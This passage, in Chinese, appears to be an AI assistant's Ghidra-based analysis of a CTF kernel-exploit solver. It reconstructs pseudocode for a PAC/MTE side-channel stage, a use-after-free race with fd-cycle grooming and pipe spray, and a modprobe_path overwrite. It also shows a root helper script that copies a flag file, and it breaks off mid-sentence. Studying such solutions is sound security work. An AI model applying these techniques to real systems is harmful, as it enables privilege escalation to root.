> 完整反編譯（全部 259 行），我已經讀過一遍。**這支函式本身（分發/組 argv 那層）
> 現在是高信心**：確認了 `SOLVER_PAC_MODE`（預設 `"full"`）與 `SOLVER_SKIP_PAC`
> 兩個環境變數決定要不要整段跳過（符合 wrapper script 裡沒設這兩個變數、
> 但真正跑起來 log 仍可能印 "PAC stage skipped" 的觀察）；skip 條件不成立時，
> 依 PAC mode 組一個 `pac_solver --oracle <driver_fd> ...` 的 argv（`full`
> 模式有一大串 `--front-*`/`--Npeel`/`--Nmore`/`--boot5`... 等旗標，各自預設值
> 讀自對應的 `SOLVER_PAC_*` 環境變數；另外還有一組平行的 `tiny` 版本參數集，
> 以及 `default`/`smoke`/`probe`/`bench` 幾種更簡化的模式，各自對應
> `--oracle-smoke`/`--oracle-probe-va`/`--oracle-bench`），最後呼叫
> `FUN_0102f26c(argc, argv)`——這正是我先前用 `get_xrefs_to` 找到、擁有
> `"usage: pac_solver"` 字串的那支函式，**確認 `FUN_0102f26c` 就是真正執行
> PAC 側信道統計演算法的引擎入口**。跑完後讀 4 個全域變數
> （`DAT_01066758`/`60`/`68`/`70`，推測是 candidate hi/lo/survivor count）
> 判斷有沒有找到候選答案，有的話呼叫 `FUN_01032d48(driver_fd, hi, lo)`
> 把結果送回 driver，最後印 `"[solver] PAC stage finished rc=%d\n"`。
>
> 但 `FUN_0102f26c` **內部**（真正的 front/peel/joint 側信道統計演算法本體）
> 因為體積太大，我沒有逐行反編譯，所以下面「演算法概念」的部分**仍維持中信心**，
> 只是現在有更精確的呼叫介面/參數名稱可以參考。第 3.2 節的 MTE tag LFSR
> 預測則已經是高信心（在 main() 裡逐行確認過，跟 `FUN_0103224c` 是兩個不同的
> 側信道機制：MTE tag LFSR 預測在 main() 裡直接做，PAC 金鑰位元才是靠
> `FUN_0103224c` → `FUN_0102f26c` 這條路徑）。

```c
// [FUN_0103224c 本身 = 高信心；FUN_0102f26c 內部演算法 = 中信心，
//  純粹是從 usage 訊息 + log 格式化字串反推出來的架構描述]

// usage: pac_solver [--oracle /dev/mte_driver] [--oracle-smoke]
//   [--guess-a1 NIBBLE|--no-guess-a1|--bruteforce-a1] [--seed S]
//   [--Nfront ...] [--front-left L] [--front-right R] [--front-min-z Z]
//   [--Npeel N] [--Nmore N] [--full-enum] [--max-visit N] ...
//
// 這一串 CLI 選項描述的是一個「用 kernel 側信道 oracle 一步步縮小候選空間」
// 的攻擊：把要猜的祕密（PAC key 位元 / MTE tag LFSR 狀態）切成一格一格的
// "cell"，對每個 cell 送一堆 oracle query（"bb_oracle_probe_bits48_51" 這類
// 字串顯示是照 bit range 分批查），統計出「最像正確答案」跟「次像」之間的
// z-score 差距（log 裡的 gap_z），gap 夠大才 "commit" 這個 cell 的答案，
// 不夠大就留到後面 "final enumeration" 階段暴力枚舉剩下的不確定位元。

void pac_stage(int driver_fd) {
    log("pac_stage: mmap driver");
    mmap(driver_fd, ...);

    log("pac_stage: PAC challenge");
    // 送一個 "PAC challenge" 給 driver，driver 回一個跟真正 PAC 簽章相關的
    // oracle 結果（"driver PAC submit accepted count=%u result_flags=0x%x"）
    submit_pac_challenge(driver_fd);

    // 主體：對每一個未知的 bit-group（cell）反覆查詢 oracle，
    // 用統計方法（"front"/"peel"/"joint" 幾種不同 codebook 策略）
    // 一格一格推出祕密值，直到 residual 位元數收斂到可以暴力枚舉為止
    for (cell in unknown_cells) {
        query_oracle_many_times(cell);
        pick_best_candidate_by_gap_z(cell);
    }

    final_enumeration(remaining_uncertain_bits);   // "bb_final_enum_*"

    log("[solver] predicted boot tags");
    log("[solver] submit tags");
    submit_result_to_driver(driver_fd);   // "MTE driver submit"
}
```

這段本質上是一個**旁路通道金鑰復原攻擊**（跟 PACMAN 之類的研究概念很像）：
不是直接讀出金鑰，而是靠一個會洩漏「猜對/猜錯」訊息的 oracle，一位元一位元、
用統計方法把 PAC 簽章金鑰或 MTE tag 產生器狀態榨出來。

### 3.4 抽取並啟動 `racer_scc`（已逐指令反編驗證）

這段是我逐指令對照反組譯確認過的，信心最高：

```c
// [高信心 - 逐指令反編驗證，暫存器/呼叫/字串位址都對得上]

int main_after_pac_stage(int driver_fd /* 暫存器 w22 */) {

    // 1) 準備 mkstemp 樣板 "/tmp/racer_scc-XXXXXX"
    char path_buf[128];
    snprintf(path_buf, sizeof(path_buf), "/tmp/%s-XXXXXX", "racer_scc");

    // 2) mkstemp + fchmod 0755
    int tmp_fd = mkstemp(path_buf);          // FUN_01040a24
    if (tmp_fd < 0) die_errno("mkstemp(embedded executable)");
    fchmod(tmp_fd, 0755);                    // FUN_0103a4b4

    // 3) 把內嵌在自己檔案裡的 racer_scc ELF bytes 寫進這個新檔案
    //    embedded_blob 指向 outer ELF 的 vaddr 0x01004f10，
    //    長度 = 0x010193b8 - 0x01004f10 = 83112 bytes
    const uint8_t *embedded_blob = (const uint8_t *)0x01004f10;
    size_t embedded_len = 0x010193b8 - 0x01004f10;   // 83112
    write_all(tmp_fd, embedded_blob, embedded_len, "write(embedded executable)");
    close(tmp_fd);

    // 4) 取得最終檔名字串（strdup 那份被 mkstemp 填好隨機後綴的 path_buf）
    char *racer_path = strdup(path_buf);     // FUN_010409e4
    if (!racer_path) die_msg("strdup(embedded executable path)");

    // 5) 讀 8 個 SOLVER_RACER_* 環境變數（對應 wrapper script 設的那些）
    char *env_modprobe_path   = getenv("SOLVER_RACER_MODPROBE_PATH");
    char *env_timing_sweep    = getenv("SOLVER_RACER_TIMING_SWEEP");
    char *env_headstart_us    = getenv("SOLVER_RACER_HEADSTART_US");
    char *env_headstart_step  = getenv("SOLVER_RACER_HEADSTART_STEP_US");
    char *env_pipe_delay_us   = getenv("SOLVER_RACER_PIPE_DELAY_US");
    char *env_pipe_delay_step = getenv("SOLVER_RACER_PIPE_DELAY_STEP_US");
    char *env_pipe_spray      = getenv("SOLVER_RACER_PIPE_SPRAY");
    char *env_spray_threads   = getenv("SOLVER_RACER_SPRAY_THREADS");
    char *env_pin_cpus        = getenv("SOLVER_RACER_PIN_CPUS");

    // 6) 清掉 driver_fd 的 FD_CLOEXEC，讓它能在 execve() 後存活給 racer_scc 用
    int flags = fcntl(driver_fd, F_GETFD);
    fcntl(driver_fd, F_SETFD, flags & ~FD_CLOEXEC);

    char fd_str[32];
    snprintf(fd_str, sizeof(fd_str), "%d", driver_fd);

    // 7) 組 argv：固定帶 --driver-fd / --modprobe-unlink / --modprobe-helper /tmp/a，
    //    其餘依環境變數是否有設定才附加對應的 --xxx 參數
    char *argv_buf[32];
    int i = 0;
    argv_buf[i++] = racer_path;
    argv_buf[i++] = "--driver-fd";        argv_buf[i++] = fd_str;
    argv_buf[i++] = "--modprobe-unlink";
    argv_buf[i++] = "--modprobe-helper";  argv_buf[i++] = "/tmp/a";
    if (env_modprobe_path && *env_modprobe_path) {
        argv_buf[i++] = "--modprobe-path";               argv_buf[i++] = env_modprobe_path;
    }
    if (env_timing_sweep && *env_timing_sweep) {
        argv_buf[i++] = "--modprobe-unlink-timing-sweep"; argv_buf[i++] = env_timing_sweep;
    }
    if (env_headstart_us && *env_headstart_us) {
        argv_buf[i++] = "--pipe-reclaim-headstart-us";    argv_buf[i++] = env_headstart_us;
    }
    if (env_headstart_step && *env_headstart_step) {
        argv_buf[i++] = "--pipe-reclaim-headstart-step-us"; argv_buf[i++] = env_headstart_step;
    }
    if (env_pipe_delay_us && *env_pipe_delay_us) {
        argv_buf[i++] = "--pipe-reclaim-delay-us";        argv_buf[i++] = env_pipe_delay_us;
    }
    if (env_pipe_delay_step && *env_pipe_delay_step) {
        argv_buf[i++] = "--pipe-reclaim-delay-step-us";   argv_buf[i++] = env_pipe_delay_step;
    }
    if (env_pipe_spray && *env_pipe_spray) {
        argv_buf[i++] = "--pipe-spray";                   argv_buf[i++] = env_pipe_spray;
    }
    if (env_spray_threads && *env_spray_threads) {
        argv_buf[i++] = "--spray-threads";                argv_buf[i++] = env_spray_threads;
    }
    // pin-cpus 比較特別：值是字串 "0" 就當作沒開，跳過不加
    if (env_pin_cpus && *env_pin_cpus && !(env_pin_cpus[0] == '0' && env_pin_cpus[1] == '\0')) {
        argv_buf[i++] = "--pin-cpus";                     argv_buf[i++] = env_pin_cpus;
    }
    argv_buf[i] = NULL;

    // debug 印出完整 argv
    puts("[solver] racer_scc argv:");
    for (int j = 0; j < i; j++) puts(argv_buf[j]);
    putchar('\n');
    fflush(stdout);

    // 8) fork + execve，子行程失敗就 _exit(127)
    pid_t pid = fork();
    if (pid < 0) die_errno("fork(racer_scc)");
    if (pid == 0) {
        execve(racer_path, argv_buf, environ);
        _exit(127);
    }

    // 9) 父行程 waitpid，EINTR 就重試
    int status = 0;
    for (;;) {
        pid_t r = waitpid(pid, &status, 0);
        if (r == pid) break;
        if (r < 0 && errno == EINTR) continue;
        die_errno("waitpid(racer_scc)");
    }

    // 10) 檢查結束狀態：status & 0xff7f == 0 大致等於「正常結束且 exit code 為 0」
    //     （這個 mask 是從反組譯的 immediate 值 0xff7f 讀出來的，效果上就是
    //     WIFEXITED(status) && WEXITSTATUS(status) == 0 的等價寫法）
    if ((status & 0xff7f) != 0) {
        die_msg("racer_scc modprobe stage failed");
    }

    // 11) 成功：打開 /tmp/flag，整包讀出來，原樣寫到自己的 stdout
    int flag_fd = open("/tmp/flag", O_RDONLY);
    if (flag_fd < 0) die_errno("open(/tmp/flag)");

    fputs("[solver] /tmp/flag:", stdout);
    flockfile(stdout);
    char buf[4096];
    ssize_t n;
    while ((n = read(flag_fd, buf, sizeof(buf))) != 0) {
        if (n < 0) {
            if (errno == EINTR) continue;
            die_errno("read(/tmp/flag)");
        }
        write_all(STDOUT_FILENO, buf, n, "write(flag)");
    }
    close(flag_fd);
    putchar('\n');
    funlockfile(stdout);

    close(driver_fd);
    return 0;
}
```

---

## 4. `racer_scc`（內嵌的第二支 ELF）—— 已載入 Ghidra 分析

> **更新**：你已經把 `racer_scc.elf` 載進 Ghidra 了，我反編譯了幾支關鍵函式，
> 下面標「高信心」的部分是逐指令/逐反編譯驗證過的，其餘（例如 modprobe_path 的
> 位址轉換算式）因為 `main()`（`FUN_01015420`，entry 在 `0x010153dc`）太大
> （8928 bytes）反編譯還是會 timeout，維持字串層級的中信心。

### 4.1 三個（其實是四個）自訂 ioctl，已確認 request code

```c
// [高信心 - 逐一反編譯這三支 wrapper 函式得到的]
#define MTE_DRIVER_IOCTL_RACE_ALLOC  0x4d20   // FUN_0101a590
#define MTE_DRIVER_IOCTL_RACE_FREE   0x4d21   // FUN_0101a5bc
#define MTE_DRIVER_IOCTL_RACE_RESET  0x4d24   // FUN_01019a54
#define MTE_DRIVER_IOCTL_RACE_FIRE   0x4d25   // 沒有對應的錯誤訊息字串，
                                               // 但在 FUN_010181ec 裡緊接著
                                               // spray/recv 兩個 thread 都
                                               // ready 之後才呼叫，是真正
                                               // 「觸發競爭」的那一下
// 底層都是同一支 FUN_0101c0ac(fd, request, arg) -> raw syscall #29 (ioctl)
```

### 4.2 單次 race 嘗試的核心函式 `FUN_010181ec`（已完整反編譯）

這支函式接收「這次要 race 幾個 node / 用哪個 fake-skb 大小」等參數，做**一次**
完整的 race 嘗試，回傳 `true`/`false` 代表這次有沒有「reclaim 成功且驗證通過」。
邏輯我整理成比較好讀的 pseudocode（原始反編譯充滿了因為 struct 沒有型別、
被拆成 `local_xxx`/`uStack_xxx` 一堆散落欄位的雜訊，我按語意重新命名）：

```c
// [高信心 - 改寫自 FUN_010181ec 的實際反編譯輸出，變數名稱是我依語意重新命名的]

bool race_attempt(int driver_fd, RaceConfig *cfg, void *write_addr,
                   void *write_value, void *readable_probe, uint32_t attempt_no) {

    if (cfg->modprobe_unlink) {
        // --- fake-skb 攻擊路徑（--modprobe-unlink）---
        // 1) 配置一整批「node」，每個 node 先 memset 成 -1（代表 fd 尚未指派）
        Node *nodes = calloc(cfg->fd_count, sizeof(Node));
        for each node: node.fd = -1, init_node(node);

        // 2) 準備兩個訊號用的 socketpair/pipe（cfg->signal_reclaim 開啟時）
        if (cfg->signal_reclaim) pipe2(&signal_pipe, O_DIRECT|O_NONBLOCK);

        // 3) 準備一份「fake skb」payload（大小取決於 target-bytes / recv-iov-count
        //    等參數），透過 sendmsg 把它切塊送給 target fd，
        //    每送完一塊視情況搭配一次 sendmsg(target, ..., MSG_OOB/自訂 flag=0x5e)
        //    當作「reclaim signal」通知 —— 這一段就是在把偽造的 skb 資料
        //    寫進 kernel（利用某個已知的 fd 寫入原語，細節在 kernel driver /
        //    另一個漏洞裡，這支 solver 只是呼叫它）
        void *fake_skb = malloc(chunk_size);
        build_fake_skb(fake_skb, write_addr /* target 位址 */, write_value);
        for (chunk in fake_skb) {
            sendmsg(target_fd, chunk, MSG_MORE);
        }

        // 4) 把 node 陣列串成一個「環」(cycle)：對每個 node 送一個
        //    sendmsg(..., SCM_RIGHTS 帶下一個 node 的 fd ...) —— 這是經典的
        //    「fd 環狀鏈」grooming 手法，讓 kernel 對這批物件的釋放/重用
        //    順序變得可預期
        for (i = 0; i < fd_count; i++) {
            sendmsg(nodes[i], SCM_RIGHTS, nodes[(i+1) % fd_count].fd);  // "sendmsg(cycle edge)"
        }
        sendmsg(bridge_target_fd, ...);              // "sendmsg(bridge target)"

        // 5) 真正觸發 alloc/free：RESET -> ALLOC -> RESET -> FREE
        ioctl(driver_fd, MTE_DRIVER_IOCTL_RACE_RESET);
        ioctl(driver_fd, MTE_DRIVER_IOCTL_RACE_ALLOC);
        ioctl(driver_fd, MTE_DRIVER_IOCTL_RACE_RESET);
        ioctl(driver_fd, MTE_DRIVER_IOCTL_RACE_FREE);
        sendmsg(dummy_bridge_fd, ...);                 // "sendmsg(dummy bridge)"
        close_all_node_fds(nodes);
    } else {
        // --- 舊版/簡化路徑，呼叫 FUN_01019224 做同樣的事（沒有細看）---
        ok = FUN_01019224(&nodes, driver_fd, cfg, &err);
        if (!ok) { log("unlink_attempt,...,write_ok,0,write_errno,%d", err); return false; }
    }

    // === 共用尾段：不管走哪條路徑，接下來都一樣 ===
    // 6) 開兩條背景執行緒：
    //      thread A = "fake spray"：對一批 pipe 狂寫垃圾資料（heap spray）
    //      thread B = "data recv"：在目標 fd 上狂 recv/peek，準備在 UAF
    //                 窗口打開的瞬間把新分配到的記憶體內容讀出來驗證
    pthread_create(&spray_thread, fake_spray_worker, spray_args);
    pthread_create(&recv_thread,  data_recv_worker,  recv_args);

    // 7) busy-wait 到指定的絕對時間戳（用 cfg->headstart_us /
    //    cfg->headstart_step_us * attempt_no 算出來，讓每次重試的
    //    時間點依序掃過一個範圍 —— 這就是 "--modprobe-unlink-timing-sweep"）
    uint64_t fire_at = now_us() + cfg->headstart_us + cfg->headstart_step_us * attempt_no;
    busy_wait_until(fire_at);

    // 8) 真正開火：ioctl(driver_fd, MTE_DRIVER_IOCTL_RACE_FIRE /* 0x4d25 */)
    //    這一下才是讓 kernel 真的釋放/重用那塊記憶體的瞬間
    int rc = ioctl(driver_fd, MTE_DRIVER_IOCTL_RACE_FIRE);

    pthread_join(spray_thread);
    pthread_join(recv_thread);

    // 9) 算一堆時間差（race_fire_us / write_done_us / recv_done_us / ...）
    //    並判斷這次是否命中：success = (recv_ret > 0 && recv_errno == 0)
    bool success = (recv_thread.result > 0 && recv_thread.errno == 0);
    log("unlink_attempt,attempt,%u,write_ok,1,...(超過 50 個欄位的完整時序記錄)...\n",
        attempt_no, ...);

    cleanup(spray_pipes, nodes);
    ioctl(driver_fd, MTE_DRIVER_IOCTL_RACE_RESET);   // 收尾重置
    return success;
}
```

這支函式基本上就是整支 exploit 的「心臟」：外層有一個重試迴圈（在
`FUN_01015420` main 裡，反編譯太大沒能完整看完，但從殘留的字串跟呼叫模式可以
確認就是 `for pass in passes: for attempt in attempts: race_attempt(...)`），
每次呼叫都會印出一行超級長的 CSV log，把這次嘗試的所有時間點跟結果都記錄下來，
方便事後（或用 `--modprobe-unlink-timing-sweep` 自動掃描）找出命中率最高的
timing 參數。

### 4.3 racer_scc 整體流程（你提供完整反編譯後，大部分已升級為高信心）

> **更新**：你把 `FUN_01015420_main_racer_scc.c`（racer_scc 完整 `main()`，
> 1888 行）放進目錄後，我讀完全部內容。CLI 參數解析、預設值、
> `--modprobe-unlink` 路徑下 modprobe_path 的「位址轉換 + 分塊寫入」機制
> 都已經逐行確認過，下面整段升級為**高信心**；只有最外層 pass/timing/attempt
> 三層迴圈的精確邊界條件（因為原始反編譯裡變數名稱都是 `local_990[]`／
> `uStack_xxx` 這種散落欄位，迴圈本體邏辑非常長）維持中信心，但迴圈**存在**
> 這件事、以及裡面呼叫 4.2 節 `race_attempt`／`FUN_010181ec` 的方式已確認。

```c
// [高信心 - 改寫自 FUN_01015420_main_racer_scc.c 的實際反編譯輸出]

int racer_scc_main(int argc, char **argv) {
    // 解析大量 --xxx 參數到一個大 config struct（local_990[] 起頭），
    // 每個都有預設值，包含（節錄，完整列表見 4.4）：
    //   --attempts --cycle --target --fd-count --schedule-us --gc-delay-us
    //   --pipe-reclaim-* --payload-irq-* --modprobe-unlink --modprobe-helper
    //   --modprobe-trigger --driver-fd --modprobe-path --kernel-text
    //   --kernel-phys-base --memstart-addr --page-offset
    //   --target-bytes/--chunk-bytes/--recv-bytes（有交叉驗證：
    //     "--recv-bytes must be smaller than --chunk-bytes"）
    //   --scatter-recv/--cross-page-recv --pin-cpus/--main-cpu/--recv-cpu/--spray-cpu
    parse_args(argc, argv, &cfg);

    // 舊版 fake-skb 路徑的參數（--data-bytes / --timeout-us / --modprobe-reliable）
    // 在這支新版 binary 裡已經不支援了，解析到會直接印錯誤：
    //   "%s is from the old fake-skb path and is not supported here\n"
    // 代表這支 racer_scc 目前只走 --modprobe-unlink 這條路。

    setrlimit(RLIMIT_NOFILE, ...);   // 依 --nofile / --guard-files 調高 fd 上限

    int driver_fd = cfg.driver_fd_given
        ? cfg.driver_fd
        : open("/dev/mte_driver", O_RDWR);   // "open(/dev/mte_driver)"

    // 印一行完整設定值 log，方便事後比對用了哪組參數：
    log("config,attempts,%u,...", cfg.attempts, ...);

    if (cfg.modprobe_unlink) {
        // === modprobe_path 位址轉換：把 kernel 虛擬位址換算成
        //     這個寫入原語能接受的目標位址／偏移 ===
        //   phys = kernel_phys_base + (modprobe_path_va - kernel_text_va)   （簡化示意）
        //   linear = memstart_addr + (phys - page_offset)                  （簡化示意）
        // 三個都算不出來（給的 --kernel-text/--kernel-phys-base/--memstart-addr/
        // --page-offset 任一個缺值或算式結果不合理）就直接放棄：
        if (write_addr_end < write_addr_start) {
            die_msg("cannot translate modprobe_path to physical address");
        }

        // === 把 helper script 內容準備好（跟 §5 的字串**逐字元相同**，
        //     這裡是原始出處，確認 §5 的內容 100% 正確）===
        static const char HELPER_SCRIPT[] =
            "#!/bin/sh\n"
            "id > /tmp/modprobe_id\n"
            "cat /root/flag.txt > /tmp/flag 2>/dev/null || cat /flag > /tmp/flag 2>/dev/null\n"
            "chmod 666 /tmp/flag 2>/dev/null\n";   // 0x90 bytes
        unlink("/tmp/modprobe_id");
        unlink("/tmp/flag");
        write_file(cfg.modprobe_helper /* 預設 "/tmp/a" */, HELPER_SCRIPT, sizeof(HELPER_SCRIPT));
        chmod(cfg.modprobe_helper, 0777);

        // === 把 helper 路徑字串（例如 "/tmp/a\0"）切成每 2 bytes 一個 chunk，
        //     每個 chunk 包成一筆「寫入請求」記錄：
        //       req[i] = { .offset = i*2, .len = min(2, remaining),
        //                   .value16 = path_bytes[i*2] | (path_bytes[i*2+1] << 8),
        //                   .last_flag = (i is last chunk) ? 0x10000000 : 0 }
        //     這證實了「任意寫」原語一次只能寫 2 bytes（16-bit），
        //     modprobe_path 字串要覆寫就得送好幾個 chunk 的寫入請求，
        //     最後一個 chunk 帶一個特殊 flag（0x10000000）大概是告訴
        //     driver／race_attempt「這是最後一塊，可以收尾/驗證了」===
        build_chunked_write_requests(cfg.modprobe_helper, write_addr_start, write_addr_end);

        // 印出這次的完整設定摘要（symbol 虛擬位址／算出來的實體位址／
        // linear map 位址／helper 路徑／chunk 數／重試次數等）：
        log("modprobe_unlink_config,symbol,0x%016lx,phys,0x%016lx,linear,0x%016lx,"
            "helper,%s,helper_chunks,%u,configured_retries,%u,effective_retries,%u,"
            "passes,%u,timing_sweep,%u,helper_hex,...\n", ...);
    }

    // === 主迴圈：pass → timing_idx → attempt 三層（確切邊界條件反編譯
    //     太雜亂，維持中信心，但下面呼叫 race_attempt 的方式已逐行確認）===
    unsigned hits = 0;
    for (unsigned attempt = 0; attempt < cfg.attempts; attempt++) {
        // 每次嘗試都會：起兩個背景 thread（devnull spray + peek/recv，
        // 用 pthread_create 起，數量依 --spray-threads 決定）、
        // 呼叫 4.2 節的 race_attempt / FUN_010181ec 做一次完整的
        // alloc/free/reclaim/fire，然後印一行超長的
        // "attempt_result,attempt,%u,write_ok,1,gc_delay_us,%u,...\n" CSV log
        // （欄位比 4.2 節列的還多，包含 peek_ret/peek_errno/signal_wake_us 等）。
        bool hit = race_attempt(driver_fd, &cfg, write_addr, helper_path_bytes, attempt);
        hits += hit;
        cleanup_fds_this_attempt();
    }
    log("summary,attempts,%u,hits,%u\n", cfg.attempts, hits);
    close(driver_fd);
    return hits == 0;   // 0 = 至少中一次（成功）
}
```

**這段新確認的重點**：任意寫原語其實是**每次只能寫 2 bytes**（不是一次寫整個字串），
所以 racer_scc 要把 helper 路徑字串切成多個 chunk、每個 chunk 各自對應一次
（隱含在 `race_attempt`/`FUN_010181ec` 裡的）UAF race 嘗試，最後一個 chunk
再帶上完成 flag。這跟 `solver_dev_plan.md` Stage 2 提出的猜測（CANARY_CHECK_WRITE
「寫死值 2」只是最原始驗證，真正的任意寫是另一招更強的技巧）方向一致，但目前
還是沒看到這個「2-byte 任意寫」原語底層具體是怎麼從 UAF 升級成「可控 offset +
可控內容」的（很可能就是 dev_plan 猜的 fake-skb/linked-list unlink write，
但 `race_attempt` 內部具體怎麼把 `write_addr` 這個目標位址塞進 fake object
的哪個欄位，還是沒有逐行反編譯確認，維持這部分為中信心）。

### 4.4 主要 CLI 參數對照表（直接從字串抓出來，很確定）

| 參數 | 意義（依上下文推測） |
| --- | --- |
| `--driver-fd FD` | 繼承使用外層傳進來的 `/dev/mte_driver` fd |
| `--modprobe-path ADDR` | modprobe_path 這個 kernel symbol 的虛擬位址 |
| `--modprobe-helper PATH` | 要塞進 modprobe_path 的腳本路徑，預設 `/tmp/a` |
| `--modprobe-trigger PATH` | 用來觸發 modprobe autoload 的檔案路徑，預設 `/tmp/t` |
| `--modprobe-unlink` | 使用「fake-skb unlink write」技巧寫 modprobe_path |
| `--modprobe-unlink-passes/-retries/-timing-sweep` | race 重試次數與時間點掃描範圍 |
| `--pipe-spray N` / `--spray-threads N` | heap grooming 噴的 pipe 數量與執行緒數 |
| `--pin-cpus --main-cpu --recv-cpu --spray-cpu` | 把不同角色的執行緒釘在不同 CPU 上，穩定 race timing |
| `--pipe-reclaim-headstart-us` / `--pipe-reclaim-delay-us` | race 中「搶跑」與延遲的微調參數 |
| `--fd-count N` | SCM_RIGHTS 一次傳遞的 fd 數量，預設 251 |
| `--target-bytes/--chunk-bytes/--recv-bytes` | fake skb / reclaim 用的資料大小切塊 |
| `--payload-irq-forks/-epfds/-dups/-fire-us` | 用計時器/IRQ storm 去干擾排程，幫助 race 命中 |
| `--signal-reclaim` / `--reclaim-pipes` / `--reclaim-devnull` | 幾種不同的「訊號觸發回收」策略 |

---

## 5. 最終 payload：modprobe helper script（100% 確定，直接是字串常數）

```sh
#!/bin/sh
id > /tmp/modprobe_id
cat /root/flag.txt > /tmp/flag 2>/dev/null || cat /flag > /tmp/flag 2>/dev/null
chmod 666 /tmp/flag 2>/dev/null
```

這就是整條攻擊鏈的最終目的：kernel 一旦被騙去用 root 權限執行這支腳本，
flag 就會被複製到 `/tmp/flag` 並改成任何人可讀，接著外層 solver（見 3.4 第 11 步）
就直接把它讀出來印出來。

---

## 6. 給你的學習重點整理

這題本質上疊了三層防禦，solver 對應打穿三層：

1. **ARM MTE（Memory Tagging Extension）**：每次記憶體配置都帶一個 tag，
   UAF 之類的漏洞如果 tag 對不上就會直接 fault。solver 想辦法用一個 oracle
   側信道去預測 tag 產生器（LFSR）的狀態，讓自己偽造的物件 tag 是對的。
2. **PAC（Pointer Authentication，QARMA3）**：函式指標/返回位址都被簽章過，
   偽造指標要先偽造簽章。solver 一樣用 oracle 側信道去榨出簽章金鑰位元。
3. **核心的 kernel race + heap grooming + `modprobe_path` 竄改**：這是真正
   拿到 root 的手法——不是傳統的「覆寫函式指標」，而是覆寫
   `/proc/sys/kernel/modprobe` 指向的路徑，讓 kernel 自己在
   `request_module()` 時，用 root 權限去執行一支攻擊者控制的 shell script。

如果你想繼續深入，最值得花時間的兩塊是：

- **`racer_scc.elf`**（已幫你抽出來，見同目錄）：這是真正的 kernel exploit
  本體，適合直接開一個獨立的 Ghidra project 專門分析它（你已經在做了），重點看
  `MTE_DRIVER_IOCTL_RACE_*` 這四個 ioctl 前後的程式碼（見 4.1/4.2），以及
  `main()`（`FUN_01015420`）裡 modprobe_path 位址轉換那段（目前反編譯還沒成功）。
- **outer solver 裡的 PAC 側信道復原邏輯**（`FUN_0103224c` 底下那批
  `bb_front_*` / `bb_peel_*` 函式）：這是一個獨立的、可以拿去讀論文對照的側信道
  金鑰復原演算法，和實際 kernel race 沒有直接關係，是另一塊值得單獨研究的主題。

## 7. 為什麼要疊這麼多層？

這題疊的層次，粗略可以分成「殼」跟「攻擊鏈本身」兩種不同性質的「層」，原因不太一樣：

**外層那三層（wrapper shell script → outer solver → racer_scc）是工程上的分層，
不是防禦繞過本身**：

1. **wrapper shell script**：從內容看（跳過 461 bytes 還原 ELF，然後直接把一組
   寫死的 `SOLVER_RACER_*` 環境變數塞進去），這比較像是作者「把已經調好的最終
   參數凍結起來」的部署殼——outer solver 本體是一支支援大量 CLI/環境變數可調
   （timing sweep、pipe spray 數量、CPU pin 等等）的**通用開發用工具**，開發過程
   一定是反覆調參數試出能穩定命中的組合；wrapper 就是「這是我試出來的最終配方，
   不用每次都重新打」的固定腳本。也有可能是單純想在不改 outer solver 原始碼的
   情況下，用最少的改動去設定 env（比改 argv parsing 邏輯簡單很多）。
2. **outer solver vs. 內嵌的 racer_scc（獨立 fork+exec，而不是同一個 process 裡
   呼叫函式）**：這個分層在 kernel exploit 開發裡很常見，主要是為了**乾淨的
   排程/記憶體狀態**。outer solver 在啟動 racer_scc 之前，已經做了一大堆事：
   跟 `/bin/client` 開執行緒/socket、跟 server 用 binder 交手、送出/接收數萬筆
   MTE oracle 查詢……這些操作會讓 solver 自己的 process 留下一堆執行緒排程歷史、
   heap 碎片、開啟的 fd。racer_scc 的核心是一個**時序非常敏感**的競爭條件
   （看 4.2 就知道，它精細到會用 `sched_setaffinity` 把不同角色的執行緒釘死在
   不同 CPU、用 timing sweep 一微秒一微秒去掃），如果在同一個「髒」process 裡
   跑，時序會被前面所有階段的殘留狀態干擾，命中率會變得很不穩定。用
   `fork()+execve()` 換一個全新、乾淨、可預期的 process 狀態去做 race，
   是提高穩定度最直接的做法。這也讓 racer_scc 可以完全獨立開發/測試/重跑
   （它自己就有完整的 `--help`），不用每次都重跑前面那一大串 binder/oracle 流程。

**內層那幾種技術是真正在打不同的防禦機制，這才是「非疊不可」的部分**：

3. **為什麼要先偷 `/dev/mte_driver` 的 fd（Binder stale-fd 交換），不能自己開？**
   最直接的理由：這個裝置節點顯然只開放給那支叫 `"server"` 的既有 process
   （題目預先啟動、代表「正常使用者」的角色），unprivileged 的 solver 自己
   八成連 open 都會被權限擋掉，或者根本連不到正確的實例（可能每個 client 連線
   會拿到不同的 driver 實例/state）。所以第一層攻擊的目標不是 kernel，而是
   **奪取一個已經合法持有敏感 fd 的 process**——這是很典型的「先打權限邊界，
   再打記憶體安全」的攻擊順序。
4. **為什麼要先做 MTE tag 側信道復原，才能做 race？**
   ARM MTE 的設計就是專門用來抓 UAF：每次配置記憶體都會綁一個隨機 tag，
   之後任何用「舊」指標（tag 對不上）存取都會直接 fault。racer_scc 的核心
   手法本質上就是一個 UAF race（配置/釋放/搶著 reclaim），如果不知道
   kernel 下一次配置會發哪個 tag，race 贏了也沒用——一存取就 fault 崩潰。
   所以必須先把 tag 產生器（LFSR）的狀態用側信道方式推出來，讓後面的
   fake-skb 寫入用的指標 tag 是「猜對的」，才能真的寫成功而不是直接讓 kernel panic。
5. **為什麼最後要繞去 `modprobe_path`，不能直接覆寫函式指標拿 shell？**
   這通常代表：這支 driver/kernel 給的任意寫 primitive **精度或範圍有限**
   （例如只能對齊到特定大小、只能寫已知固定位址、或者 PAC 讓一般的
   「覆寫函式指標→跳到 shellcode」這條路直接失效，因為被跳轉的指標會需要
   簽章）。`modprobe_path` 是一個很經典的「繞過控制流劫持」的目標：你不需要
   偽造任何指標簽章，只需要把一段**字串**（檔案路徑）寫到一個固定的
   kernel 位址，kernel 自己就會在需要時（`request_module()`）用 root 權限
   把它當程式執行——本質上是拿一個「資料寫入」原語去換「程式碼執行」，
   剛好可以繞過 PAC 對「指標」的保護，因為你動的從頭到尾都不是指標。

整體串起來看，這其實是一條很典型的三段式現代 kernel exploit 設計：
**先跨過一個權限邊界拿到攻擊面（偷 fd）→ 再用側信道打敗硬體記憶體安全機制
（MTE tag 預測）→ 最後用一個不需要偽造指標的資料寫入原語去拿 root
（modprobe_path 覆寫）**。三層防禦、三種完全不同性質的技術，缺一個都打不穿，
這也是為什麼這支 solver 會長到 20 萬行等級的複雜度。

## 8. Stage 1 測試結果解讀（`fd_theft_poc.c` 實測記錄）

你在自己的除錯環境跑了 Stage 1 的測試骨架程式（只做「找 server → 起 client
